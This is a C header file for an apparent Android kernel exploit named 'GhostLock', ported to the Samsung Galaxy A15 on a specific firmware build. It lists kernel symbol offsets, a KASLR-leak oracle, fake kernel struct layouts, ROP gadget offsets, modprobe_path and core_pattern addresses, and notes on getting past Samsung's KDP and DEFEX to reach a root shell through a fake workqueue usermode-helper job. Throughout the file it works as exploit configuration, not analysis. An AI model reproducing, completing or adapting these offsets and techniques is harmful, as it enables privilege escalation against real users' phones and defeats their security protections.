#ifndef TARGET_A15_H
#define TARGET_A15_H

/* GhostLock A15 port — Samsung Galaxy A15 (SM-A156U)
 * Kernel: 5.15.189-android13-8-33641424, SPL 2026-07-05
 * Firmware: A156USQSCEZG1
 *
 * All symbol offsets are _text-relative (link-time), verified against the
 * A156U firmware Image kallsyms (122,567 symbols). CONFIG_RANDOMIZE_BASE=y:
 * add the runtime slide to every address before use.
 *
 * KDP: PRESENT (CONFIG_KDP=y, CONFIG_KDP_CRED=y) — cred-write endgame is dead.
 *      This port MUST use the wq_umh_root endgame.
 * DEFEX: PRESENT — UMH helper needs the bind-mount workaround (see main.c).
 */

#define TARGET_A15 1

#define BUILD_VARIANT_LABEL "ghostlock_a15"
#define BUILD_FINGERPRINT "samsung/a15"

/* Kernel address space (VA_BITS=39) */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
/* physmap span: verify on device; 0x40000000 base from vendor_boot + DT */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
/* Android 5.15 arm64 layout, VA_BITS=39, struct page=64 bytes:
 * VMEMMAP_START = -(1 << (VA_BITS - (PAGE_SHIFT - order_base_2(sizeof(page)))))
 * = 0xfffffffe00000000.  This differs from the A17 6.12 start. */
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Global symbol offsets (_text-relative, from A156U kallsyms) */
#define INIT_TASK_OFF          0x02A49080ULL
#define INIT_CRED_OFF          0x02040EA0ULL
#define INIT_UTS_NS_OFF        0x02A4A468ULL
#define EMPTY_ZERO_PAGE_OFF    0x02AF5000ULL
#define ROOT_TASK_GROUP_OFF    0x02AF9AC0ULL
/* No selinux_enforcing symbol on 5.15; selinux_state.enforcing is a
 * 1-byte bool at selinux_state+0. */
#define SELINUX_ENFORCING_OFF  0x02BCDED8ULL
#define KPTR_RESTRICT_OFF      0x028DDB24ULL
#define CAP_CAPABLE_ACTIVE_OFF 0x0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x01F15220ULL
#define SECURITY_HOOK_HEADS_OFF 0x01F15250ULL
#define KMALLOC_CACHES_OFF     0x01F1E6C8ULL
#define ANON_PIPE_BUF_OPS_OFF  0x01D5E260ULL
/* UMH root: workqueue symbol offsets */
#define SYSTEM_UNBOUND_WQ_OFF              0x028E07D8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x00104598ULL
#define CONFIGFS_READ_ITER_OFF      0x005D22A8ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005D2CD0ULL
#define COPY_SPLICE_READ_OFF   0x0ULL
#define NOOP_LLSEEK_OFF        0x004BA3E8ULL
#define ASHMEM_MISC_FOPS_OFF   0x02A40EA8ULL
#define ASHMEM_FOPS_OFF        0x01EC7820ULL
#define ASHMEM_IOCTL_OFF       0x001059670ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0ULL
#define ASHMEM_MMAP_OFF        0x001059D24ULL
#define ASHMEM_OPEN_OFF        0x00105A004ULL
#define ASHMEM_RELEASE_OFF     0x00105A09CULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00105A1B8ULL

/* KASLR leak anchors (A156U kallsyms) */
#define SLIDE_NFULNL_LOGGER_OFF       0x028E1E28ULL
#define SLIDE_LOGGERS_0_1_OFF         0x028E1D50ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02CAFAA1ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x02CAFAA1ULL

/* boot_id ctl_table entry (decoded from Image, random_table[4]) */
#define SYSCTL_BOOTID_ENTRY_OFF  0x029FEDC0ULL
#define PROC_DO_UUID_OFF         0x00B1FB60ULL

/* Per-cpu runqueue anchor — NOT yet recovered for A15.
 * Needed only for the rq->curr task discovery path; the task-list walk
 * fallback does not need these. Set to 0 until verified. */
#define PER_CPU_OFFSETS_OFF  0x0ULL
#define RUNQUEUES_OFF        0x0ULL
#define INIT_STACK_OFF       0x0ULL
#define RQ_CURR_OFF          0x0ULL
#define PER_CPU_OFFSETS      (KIMAGE_TEXT_BASE + PER_CPU_OFFSETS_OFF)
#define RUNQUEUES            (KIMAGE_TEXT_BASE + RUNQUEUES_OFF)
#define INIT_STACK           (KIMAGE_TEXT_BASE + INIT_STACK_OFF)
#define TASK_STACK_OFF       0x30ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
/* Samsung KDP: kdp_enable byte. A156U: @ image+0x2040e98.
 * Cred writes are silently dropped while KDP is active — do NOT use
 * the cred-write route on this target. */
#define KDP_ENABLE_OFF         0x02040E98ULL
#define KDP_ENABLE             (KIMAGE_TEXT_BASE + KDP_ENABLE_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define PSELECT_WAITER_WORD_SHIFT 0

/* struct rt_mutex_waiter — 5.15 layout (BTF-verified, this exact build).
 * 88 bytes (0x58). NO pi_prio/pi_deadline fields (unlike 6.12).
 * tree_entry@0x00, pi_tree_entry@0x18, task@0x30, lock@0x38,
 * wake_state@0x40, prio@0x44, deadline@0x48, ww_ctx@0x50. */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x18
#define WAITER_TASK_OFF           0x30
#define WAITER_LOCK_OFF           0x38
#define WAITER_WAKE_STATE_OFF     0x40
#define WAITER_PRIO_OFF           0x44
#define WAITER_DEADLINE_OFF       0x48
#define WAITER_WW_CTX_OFF         0x50

#define FAKE_WAITER_PI_TREE_ENTRY_OFF  0x18
#define FAKE_WAITER_TASK_OFF           0x30
#define FAKE_WAITER_LOCK_OFF           0x38
#define FAKE_WAITER_WAKE_STATE_OFF     0x40
#define FAKE_WAITER_PRIO_OFF           0x44
#define FAKE_WAITER_DEADLINE_OFF       0x48
#define FAKE_WAITER_WW_CTX_OFF         0x50

/* task_struct field offsets — 5.15 (BTF-verified). These are compile-time
 * defaults; runtime_struct_offsets.h overrides from the active table. */
#define FAKE_TASK_USAGE_OFF          0x38
#define FAKE_TASK_PRIO_OFF           0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF    0x84
#define FAKE_TASK_TASK_GROUP_OFF     0x400
#define FAKE_TASK_PI_LOCK_OFF        0x884
#define FAKE_TASK_PI_WAITERS_OFF     0x898
#define FAKE_TASK_PI_TOP_TASK_OFF    0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x8b0

#define MM_OWNER_OFF             0x0ULL
#define TASK_PID_OFF             0x5d8
#define TASK_TGID_OFF            0x5dc
#define TASK_REAL_PARENT_OFF     0x5e8
#define TASK_ATOMIC_FLAGS_OFF    0x598
#define TASK_REAL_CRED_OFF       0x790
#define TASK_CRED_OFF            0x798
#define TASK_COMM_OFF            0x7a8
#define TASK_TASKS_OFF           0x4d0
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x860
/* fdtable walk: own task -> files -> fdt -> fd[] */
#define TASK_FILES_OFF           0x7d8
#define FILES_FDT_OFF            0x20
#define FDT_MAX_FDS_OFF          0x00
#define FDT_FD_OFF               0x08
/* channel slide anchors */
#define TASK_ACTIVE_MM_OFF       0x528
#define INIT_MM_OFF              0x0ULL
#define SYSCTL_BOOTID_ENTRY_OFF  0x029FEDC0ULL
#define PROC_DO_UUID_OFF         0x00B1FB60ULL

/* struct cred — 5.15 (BTF-verified). Kept for reference; KDP blocks
 * the cred-write route on this target. */
#define CRED_UID_OFF         4
#define CRED_SECUREBITS_OFF  36
#define CRED_CAPS_OFF        40
#define CRED_SECURITY_OFF    120
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* struct page — verified against this A15 firmware's BTF (64-byte page).
 * slab_cache is 16 bytes into the first union, which begins at byte 8. */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

/* pipe_buffer / pipe_inode_info — 5.15 (BTF-verified, exact build) */
#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xc8
#define FOPS_SHOW_FDINFO_OFF  0xe0

#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080

/* boot_id sysctl data pointer: sysctl_bootid @ image+0x2cafaa1 (BSS).
 * The ctl_table entry is at image+0x29fedc0; its .data (at +0x8) points
 * to sysctl_bootid. The KASLR oracle overwrites the entry's data pointer. */
#define SYSCTL_BOOTID_DATA_PTR_OFF 0x02CAFAA1ULL
#define SYSCTL_BOOTID_DATA_PTR (KIMAGE_TEXT_BASE + SYSCTL_BOOTID_DATA_PTR_OFF)
/* fake-work staging area inside the payload page (wq-umh) */
#define WQ_FAKE_WORK_OFF 0x1700
#define WQ_FAKE_UMH_OFF  0x1800

/* Workqueue struct offsets — 5.15 (BTF-verified, this exact build).
 * NOTE: these DIFFER from the 6.x values hardcoded in umh_root.c.
 * umh_root.c must use these (see PORTING-NOTES.md). */
#define WQ_DFL_PWQ_OFF       0xb0
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x5c
#define PWQ_MAX_ACTIVE_OFF   0x60
#define POOL_WORKLIST_OFF    0x20
#define POOL_NR_IDLE_OFF     0x34
#define WORK_DATA_OFF        0x00
#define WORK_ENTRY_OFF       0x08
#define WORK_FUNC_OFF        0x18

/* subprocess_info field offsets — 5.15 (BTF-verified) */
#define SUBPROCESS_COMPLETE_OFF 0x30
#define SUBPROCESS_PATH_OFF     0x38
#define SUBPROCESS_ARGV_OFF     0x40
#define SUBPROCESS_ENVP_OFF     0x48

/* ---- Fixup batch 2026-10-04: identifiers missing from the initial port ----
 * Provenance noted per macro. All _text-relative offsets are link-time;
 * CONFIG_RANDOMIZE_BASE=y — add the runtime slide before use.
 */

/* kallsyms-resolved data symbols (A156U Image, 122,567 symbols) */
#define INIT_SEC_OFF      0x02040F50ULL  /* init_sec     D 0xffffffc00a040f50 */
#define INIT_USER_NS_OFF  0x02A6CDA8ULL  /* init_user_ns D 0xffffffc00aa6cda8 */
#define INIT_UCOUNTS_OFF  0x02902828ULL  /* init_ucounts D 0xffffffc00a902828 */
#define INIT_GROUPS_OFF   0x029024B0ULL  /* init_groups  d 0xffffffc00a9024b0 */
#define INIT_SEC      (KIMAGE_TEXT_BASE + INIT_SEC_OFF)
#define INIT_USER_NS  (KIMAGE_TEXT_BASE + INIT_USER_NS_OFF)
#define INIT_UCOUNTS  (KIMAGE_TEXT_BASE + INIT_UCOUNTS_OFF)
#define INIT_GROUPS   (KIMAGE_TEXT_BASE + INIT_GROUPS_OFF)

#define CORE_PATTERN_OFF   0x029AB210ULL  /* core_pattern  D 0xffffffc00a9ab210 */
#define MODPROBE_PATH_OFF  0x02902938ULL  /* modprobe_path D 0xffffffc00a902938 */
#define CORE_PATTERN  (KIMAGE_TEXT_BASE + CORE_PATTERN_OFF)
#define MODPROBE_PATH (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)

/* wq-umh critical path: generic names (replaces BZA5-suffixed a17 names;
 * call sites in main.c updated accordingly) */
#define SYSTEM_WQ_OFF  0x028ECED8ULL  /* system_wq, symbol-offsets.csv */
#define SYSTEM_WQ      (KIMAGE_TEXT_BASE + SYSTEM_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
    (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)  /* OFF=0x00104598, above */

/* boot_id KASLR oracle: the "boot_id" procname string.
 * Decoded ctl_table entry (boot_id-entry.json): procname pointer at
 * 0xffffffc009ce2406 -> "boot_id". */
#define BOOTID_STR_IMG_OFF 0x01CE2406ULL

/* Gadget / window values — resolved from the A156U kernel Image
 * (SHA-256 8c9ea584..., _text-relative offsets):
 * - NOOP_GADGET_OFF: bare `ret` (0xD65F03C0) at a cold function epilogue
 *   (verified bytes in Image). Used as safe fops override; also doubles as
 *   an oracle (returns x0 = file* on ioctl entry).
 * - ASHMEM_IOCTL_WIN_LO/HI_OFF: ashmem_ioctl (kallsyms ffffffc009059670,
 *   off 0x1059670) through compat_ashmem_ioctl end (ashmem_mmap start
 *   ffffffc009059d24, off 0x1059D24). Perf-sample IP filter window for the
 *   filp-route file-pointer leak scan.
 * - FILP_COMMIT_GADGET_OFF: STILL A PLACEHOLDER (0xDEAD0000). Not on the
 *   A15 wq-umh critical path (env-gated filp routes only); resolve from
 *   the Image per the finder recipe in PORTING-NOTES.md before using any
 *   filp route. */
#warning "A15: FILP_COMMIT_GADGET_OFF is a PLACEHOLDER (0xDEAD0000) — see PORTING-NOTES.md; not on wq-umh critical path"
#define NOOP_GADGET_OFF         0x00023974ULL
#define FILP_COMMIT_GADGET_OFF  0xDEAD0000ULL
#define ASHMEM_IOCTL_WIN_LO_OFF 0x01059670ULL
#define ASHMEM_IOCTL_WIN_HI_OFF 0x01059D24ULL

#endif /* TARGET_A15_H */

/* SLIDE mode pselect shift (pselect vs select stack frame diff 16B = 2 words) */
#define SLIDE_PSELECT_WORD_SHIFT 2
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1
